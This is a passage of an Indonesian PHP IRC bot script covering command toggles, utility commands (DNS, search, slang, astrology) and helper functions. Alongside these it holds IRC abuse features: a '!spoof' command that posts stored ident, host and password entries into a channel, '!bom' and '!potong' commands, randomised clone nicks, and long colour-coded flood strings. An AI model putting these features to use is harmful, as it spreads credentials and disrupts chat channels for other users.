                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='TIME' && $sysok==1 && $getlvl > 2){
                                                $systembot['TIME'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'TIME '. strtoupper($targetsys).' is [4'.strtoupper($systembot['TIME'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FINGER' && $sysok==1 && $getlvl > 2){
                                                $systembot['FINGER'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FINGER '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FINGER'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ISON' && $sysok==1 && $getlvl > 2){
                                                $systembot['ISON']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'ISON is [4'.strtoupper($systembot['ISON']['ALL']).']');
                                            }
                                            if($wsys=='ASTRO' && $sysok==1 && $getlvl > 2){
                                                $systembot['ASTRO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'ASTRO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['ASTRO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SPOOF' && $sysok==1 && $getlvl > 2){
                                                $systembot['SPOOF'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SPOOF '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SPOOF'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='DNS' && $sysok==1 && $getlvl > 2){
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BOM' && $sysok==1 && $getlvl > 2){
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GREET' && $sysok==1 && $getlvl > 2){
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GOOGLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['GOOGLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GOOGLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GOOGLE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='IMAGE' && $sysok==1 && $getlvl > 2){
                                                $systembot['IMAGE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'IMAGE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['IMAGE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VIDEO' && $sysok==1 && $getlvl > 2){
                                                $systembot['VIDEO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VIDEO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VIDEO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='CALC' && $sysok==1 && $getlvl > 2){
                                                $systembot['CALC'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'CALC '. strtoupper($targetsys).' is [4'.strtoupper($systembot['CALC'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SLAPS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SLAPS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SLAPS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SLAPS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='KSLANG' && $sysok==1 && $getlvl > 2){
                                                $systembot['KSLANG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'KSLANG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['KSLANG'][strtoupper($targetsys)]).']');
                                            }
					    if($wsys=='YM' && $sysok==1 && $getlvl > 2){
                                                $systembot['YM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'Cek YM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['YM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOCYCLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                            }
					    if($wsys=='AUTOMSG' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOMSG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOMSG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOMSG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOACT' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOACT'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOACT '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOACT'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOJOIN' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOAWAY' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOAWAY']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOAWAY is [4'.strtoupper($systembot['AUTOAWAY']['ALL']).']');
                                            }
                                            if($wsys=='LISTGREET' && $dCom[1] && $dCom[2] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                $ddc=strtolower($dCom[1]);$greetmsg["$ddc"]["nama"]=$dCom[1];$mgreet=str_replace($dCom[0]." ".$dCom[1]." ","",$TxtMsg);
						$greetmsg["$ddc"]["msg"]=$mgreet;$modbot->notice($fp,$fsrc[nick],'Auto Greet For :'.$greetmsg["$ddc"]["nama"]);
                                                $modbot->notice($fp,$fsrc[nick],'Auto Greet Msg :'.$greetmsg["$ddc"]["msg"]);
                                                }else{$eel=strtolower($dCom[1]);unset($greetmsg["$eel"]["nama"]);unset($greetmsg["$eel"]["msg"]);$modbot->notice($fp,$fsrc[nick],'Delete Greet For :'.$eel);}
                                            }
                                            if($wsys=='LISTISON' && $dCom[1] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                    if($modbot->add_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is now in my list');}
                                                    else{$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is already in my list');}
                                                }
                                                else{if($modbot->del_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' has been deleted');}}
                                            }
					    if($wsys=='LOGTARGET' && $sysok==1 && $getlvl > 2){ $systembot['LOGTARGET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'LOGTARGET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['LOGTARGET'][strtoupper($targetsys)]).']');	}
					    if($wsys=='RECORD' && $dCom[1] && $getlvl > 2){
						$prt=strtoupper($dCom[1]);
						if ($prt=='SHOWINCHAN'){
							if($onoff=="3ON"){$targetinchan=1;}
							else {$targetinchan=0;}
							$modbot->notice($fp,$fsrc[nick],'Record to chan is ' . $onoff);
						}
					    	elseif($prt=='SAVETOSITE'){
							if($onoff=="3ON"){$targetinsite=1;}
							else {$targetinsite=0;}
							$modbot->notice($fp,$fsrc[nick],'Record to site is ' . $onoff);
					    	}
					    }
                                        }
                                        ################################ SYSTEM ###################################
                                            
                                    }
                                }
                                elseif (substr($Params[3],0,2)==':!'){
                                    if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $systembot['PING'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if(strtolower($dCom[1])=='me'){$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}else {$modbot->stuf_ping($fp,$Params[2],$dCom[1]);}
                                        }else{$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}
                                    }
				   if (strtolower($Params[3])==':!ym' && ereg('#',$Params[2]) && $systembot['YM'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->msg($fp,$Params[2],$modbot->cek_ym($dCom[1]));
                                        }
                                    }
                                    elseif (strtolower($Params[3])==':!version' && ereg('#',$Params[2]) && $systembot['VERSION'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'VERSION');$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datversi[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !version <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!time' && ereg('#',$Params[2]) && $systembot['TIME'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'TIME');$dattime[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$dattime[strtolower($Params[4])]["chan"]=$Params[2];}
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !time <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!google' && ereg('#',$Params[2]) && $systembot['GOOGLE'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $ktkt=substr($TxtMsg,8);
                                            $modbot->googleser($fp,$Params[2],$ktkt);
                                        }
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !google <kata>');}
                                    }
                                    elseif (strtolower($Params[3])==':!image' && ereg('#',$Params[2]) && $systembot['IMAGE'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $ktkt=substr($TxtMsg,7);
                                            $modbot->googleimg($fp,$Params[2],$ktkt);
                                        }
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !image <kata>');}
                                    }
                                    elseif (strtolower($Params[3])==':!calc' && ereg('#',$Params[2]) && $systembot['CALC'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $ktkt=substr($TxtMsg,6);
                                            $modbot->googlecalc($fp,$Params[2],$ktkt);
                                        }
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !calc <proses>');}
                                    }
                                    elseif (strtolower($Params[3])==':!video' && ereg('#',$Params[2]) && $systembot['VIDEO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $ktkt=substr($TxtMsg,7);
                                            $modbot->googlevideo($fp,$Params[2],$ktkt);
                                        }
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !video <kata>');}
                                    }
                                    elseif (strtolower($Params[3])==':!finger' && ereg('#',$Params[2]) && $systembot['FINGER'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'FINGER');$datfinger[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datfinger[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !finger <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!dns' && ereg('#',$Params[2]) && $systembot['DNS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if (ereg("[a-zA-Z]", $dCom[1])) {$res = gethostbyname($dCom[1]);}
                                            elseif (ereg("[0-9]", $dCom[1])) {$res = gethostbyaddr($dCom[1]);}
                                            if ($res==$dCom[1]) { $res = "not resolved."; }
                                            else { $res = "resolved to: $res ."; }
                                            $modbot->msg($fp,$Params[2],'DNS Query for: '.$dCom[1] . ' ' .$res);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !dns <host>');}
                                    }
                                    elseif (strtolower($Params[3])==':!astro' && ereg('#',$Params[2]) && $systembot['ASTRO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->notice($fp,$fsrc[nick],'15(04Astro15) '. $modbot->mod_astro($dCom[1]));
                                        }else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!astro <bintang>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON") {
					$spoofnya=strtolower($Params[4]);
					if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
						fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
					}
					else {$modbot->notice($fp,$frsc[nick],'15(04Spoof15) Request Error');}
                                    }
                                    elseif (strtolower($Params[3])==":!kslang" && ereg('#',$Params[2]) && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON") {
                                        $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                        if($Params[4]<=$kmjml[strtolower($ktslsl)] && $Params[4]>0){
                                            $nomere=$Params[4]-1;
                                            if(strpos($kmusedan[$nomere]["definisi"][strtolower($ktslsl)],"<br>")){
                                            $defedan=explode("<br>",$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$darredan);
                                                    sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["definisi"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                            }
                                            if(strpos($kmusedan[$nomere]["contoh"][strtolower($ktslsl)],"<br>")){
                                                $defedan=explode("<br>",$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$darredan);
                                                        sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["contoh"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                            }
                                        }
                                        else{
                                            fputs($fp,'PRIVMSG '.$Params[2].' :15(04KSlang15) Request Error'. CRLF);
                                        }
                                        
                                    }
                                    elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $Params[5]) {
                                        $typeup=strtolower($Params[4]);
                                        if($typeup=='spoof' && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Spoof15) Update Complete! FOUND :'.$modbot->mod_uspoof($fp,$Params[5]).' Spoof');
                                        }
                                        elseif($typeup=='kslang' && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON"){
                                            $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                            $modbot->msg($fp,$Params[2],'15(04KSlang15) Update Complete! FOUND :'.$modbot->mod_uslang($fp,$ktslsl).' Arti'); 
                                        }
					elseif($typeup=='automsg' && $systembot['AUTOMSG'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Msg15) Update Complete! FOUND :'.$modbot->mod_updatemsg($Params[5]).' Message'); 
                                        }
                                        elseif($typeup=='autoact' && $systembot['AUTOACT'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Action15) Update Complete! FOUND :'.$modbot->mod_updateact($Params[5]).' Action'); 
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!bom" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_bom($fp,$Params[2],$Params[4]);
                                    }
                                    elseif (strtolower($Params[3])==":!potong" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_potong($fp,$fsrc[nick],$Params[2],$Params[4]);
                                    }
                                }
                                ########### NET ############
                                elseif (substr($Params[3],0,3)==':~@' && strtolower($Params[2])==strtolower($bot['roomnet'])){
                                }
                                ############################
                                break;
                        }
                        ##[ AKHIR DATA RAW NIH ]##
                }
                ### PERMAINAN PING PONG ###
                elseif ( substr($DataLine,0,4) == 'PING' ) {$modbot->send($fp,'PONG ' . substr($DataLine,5));}
                $response ="";
            }
            ##[ End Proses Data Recv ]##
        }
	sleep(2);
        fclose ($fp);
        unset ($fp);
        $response='';
    }
}  while ($keluar==0);
################### [ END CONNECT ] ###################


################### [ CLASS IRC BOT ] #####################
class module_bot{
function rand_str($size){
        $feed = "0123456789abcdefghijklmnopqrstuvwxyz";
        for ($i=0; $i < $size; $i++){$rand_str .= substr($feed, rand(0, strlen($feed)-1), 1);}
        return $rand_str;
    }

    function rnd_logo(){
        $nlogo=array("0,7C7,0O0,7M7,0P0,7U7,0T0,7A7,0R0,7E","0,1C1,0O0,1M1,0P0,1U1,0T0,1A1,0R0,1E",
                     "0,2C2,0O0,2M2,0P0,2U2,0T0,2A2,0R0,2E","0,3C3,0O0,3M3,0P0,3U3,0T0,3A3,0R0,3E",
                     "0,4C4,0O0,4M7,0P0,4U4,0T0,4A4,0R0,4E","0,6C6,0O0,6M6,0P0,6U6,0T0,6A6,0R0,6E",
                     "0,5C5,0O0,5M5,0P0,5U5,0T0,5A5,0R0,5E","0,14C14,0O0,14M14,0P0,14U14,0T0,14A14,0R0,14E",
		     "(15(4Computare 12Tc12L15))","(15(4Computare 12pH12p15))"
                     );
        return $nlogo[rand(0,count($nlogo) - 1)];
    }
    function rnd_nick(){
        $nickbot=array("alita-1", "alita-2", "alita-3", "alita-4", "alita-5", "alita-6", "alita-7", "alita-8", "alita-9", "alita-10","alita-11","alita-12","alita-13",
	"alita-14", "alita-15", "alita-16", "alita-17", "alita-18", "alita-19", "alita-20", "alita-21", "alita-22", "alita-23","alita-24","alita-25","alita-26","alita-27","alita-28",
	"alita-29", "alita-30", "alita-31", "alita-32", "alita-33", "alita-34", "alita-35", "alita-36", "alita-37", "alita-38","alita-39","alita-40","alita-41","alita-42","alita-43",
	"alita-44", "alita-45", "alita-46", "alita-47", "alita-48", "alita-49", "alita-50", "alita-51", "alita-52", "alita-53","alita-54","alita-55","alita-56","alita-57","alita-58",
        "alita-59", "alita-60", "alita-61", "alita-62", "alita-63", "alita-64", "alita-65", "alita-66", "alita-67", "alita-68","alita-69","alita-70","alita-71","alita-72","alita-73",
	"alita-74", "alita-75", "alita-76", "alita-77", "alita-78", "alita-79", "alita-80", "alita-81", "alita-82", "alita-83","alita-84","alita-85","alita-86","alita-87","alita-88",
	"alita-89", "alita-90", "alita-91", "alita-92", "alita-93", "alita-94", "alita-95", "alita-96", "alita-97", "alita-98","alita-99","alita-100","alita-101","alita-102","alita-103",
	"alita-104", "alita-105", "alita-106", "alita-107", "alita-108", "alita-109", "alita-110", "alita-111", "alita-112", "alita-113","alita-114","alita-115","alita-116","alita-117","alita-118",
        "alita-119", "alita-120", "alita-121", "alita-122", "alita-123", "alita-124", "alita-125", "alita-126", "alita-127", "alita-128","alita-129","alita-130","alita-131","alita-132","alita-133",
	"alita-134", "alita-135", "alita-136", "alita-137", "alita-138", "alita-139", "alita-140", "alita-141", "alita-142", "alita-143","alita-144","alita-145","alita-146","alita-147","alita-148",
	"alita-149", "alita-150", "alita-151", "alita-152", "alita-153", "alita-154", "alita-155", "alita-156", "alita-157", "alita-158","alita-159","alita-160","alita-161","alita-162","alita-163",
	"alita-164", "alita-165", "alita-166", "alita-167", "alita-168", "alita-169", "alita-170", "alita-171", "alita-172", "alita-173","alita-174","alita-175","alita-176","alita-177","alita-178",
        "alita-179", "alita-180", "alita-181", "alita-182", "alita-183", "alita-184", "alita-185", "alita-186", "alita-187", "alita-188","alita-189","alita-190","alita-191","alita-192","alita-193",
	"alita-194", "alita-195", "alita-196", "alita-197", "alita-198", "alita-199", "alita-200", "alita-201", "alita-202", "alita-203","alita-204","alita-205","alita-206","alita-207","alita-208",
	"alita-209", "alita-210", "alita-211", "alita-212", "alita-213", "alita-214", "alita-215", "alita-216", "alita-217", "alita-218","alita-219","alita-220","alita-221","alita-222","alita-223",
	"alita-224", "alita-225", "alita-226", "alita-227", "alita-228", "alita-229", "alita-230", "alita-231", "alita-232", "alita-234","alita-235","alita-236","alita-237","alita-238","alita-239",
        "alita-240", "alita-241", "alita-242", "alita-243", "alita-244", "alita-245", "alita-246", "alita-247", "alita-248", "alita-249","alita-250","alita-251","alita-252","alita-253","alita-254",
	"alita-255", "alita-256", "alita-257", "alita-258", "alita-259", "alita-260", "alita-261", "alita-262", "alita-263", "alita-264","alita-265","alita-266","alita-267","alita-268","alita-269",
	"alita-270", "alita-271", "alita-272", "alita-273", "alita-274", "alita-275", "alita-276", "alita-277", "alita-278", "alita-279","alita-280","alita-281","alita-282","alita-283","alita-284",
	"alita-285", "alita-286", "alita-287", "alita-288", "alita-289", "alita-290", "alita-291", "alita-292", "alita-293", "alita-294","alita-295","alita-296","alita-297","alita-298","alita-299"
        );
        return $nickbot[rand(0,count($nickbot) - 1)];
    }
    function rnd_ident(){
        $identbot=array("alita", "mazi", "", "ping", "uni", "raka", "ari", "ria", "nina", "ani","dahlia","didi",
	"doni", "rika", "kari", "momo", "mimi", "susi", "nunuk", "lala", "babe", "sani","daniel","dedi",
	"sahara", "agil", "lili", "ghea", "gea", "riri", "sari", "asri", "tutik", "dian","maria","teteh",
	"Vany","Viola","Vera","Yeni","Lia","Sari","Meme","Tia","Liza","Mira","Reni","Dinda","Tia","Anggi","Putri","Anggun"
        );
        return $identbot[rand(0,count($identbot) - 1)];
    }
    function rnd_real(){
        $realbot=array("suci", "lina", "dika", "udha", "uni", "raka", "ari", "ria", "nina", "ani","dahlia","didi",
	"doni", "rika", "kari", "momo", "mimi", "susi", "nunuk", "lala", "babe", "sani","daniel","dedi",
	"sahara", "agil", "lili", "ghea", "gea", "riri", "sari", "asri", "tutik", "dian","maria","teteh",
	"Vany","Viola","Vera","Yeni","Lia","Sari","Meme","Tia","Liza","Mira","Reni","Dinda","Tia","Anggi","Putri","Anggun"
        );
        return $realbot[rand(0,count($realbot) - 1)];
    }
    function rnd_away(){
        $awaybot=array("Maen kApAl�an ach!","Call FBI if i dont comeback in 24 hours","eweii from kibor","System Shoutdown","Allnetwork PhpBot","Run on Linux Pentium I","Auto Away On Idle","watching tv",
                       "surfing with the alien");
        return $awaybot[rand(0,count($awaybot) - 1)];
    }
    function rnd_cycle(){
        $strcycle=array("cycling is not a crimE!","15,1jungkir balik","K4m4r1 b3d0","pOnt4nG p4nt14nG","Critical Cycle!","wRoNG FunCTioN","Cycle System Running!","I need cycle now!",
                        "4[2K4]illing...my enemies","jOin paRt","No regret for inviter!","ronda.","JungKIr BaLiK","ReHash","Refreshing!","Going Out and Back!",
                        "bersihin layar","Mw Cuci LCD Q duLU"
                       );
        return $strcycle[rand(0,count($strcycle) - 1)];
    }
    function rnd_flod(){
        $strflod=array("1*kO2pEt3* !K4oPe5T! #6kOpE7t# [1KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#7 [Ko8PeT]9 {kOp10Et}11 %Ko12PeT13% @kO14pEt15@ *kO1pEt2* !KoP3eT! 4#kOp5Et# 6[KoP7eT] {8kOp9Et10} %Ko11PeT% 12@kO13pEt14@ 1*kO2pEt3* !K4oPe5T! #6kOpE7t# [8KoP9eT]10 {kO11pEt}12 %Ko13PeT14% @kO15pEt@ 1*kOp12Et3* !Ko4PeT5! #kO6pEt#",
                       "4,11BeBeK 5aDuS 6kAlI 12WekZ13WekZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7k Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ 12,4BeB14eK aD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ 11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS 3kAl6I Wek5ZWek15Z We13kZWek W9ekZW2ekZ 9,1BeBeK a14DuS k14AlI W13ekZWe12kZ We11kZWek 10WekZ9WekZ 8,2BeBeK 7aDuS 6kAlI5 Wek4ZWekZ3 Wek2ZWek 1WekZW15ekZ 13,9Be14BeK 13aDuS k12AlI We10kZWek14Z We8kZWek 7WekZW6ekZ 12,7BeBeK 8aDuS 13kAlI 6WekZ5WekZ4 Wek3ZWek2 WekZ1WekZ",
                       "HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha ",
                       "9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA",
                       "@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@",
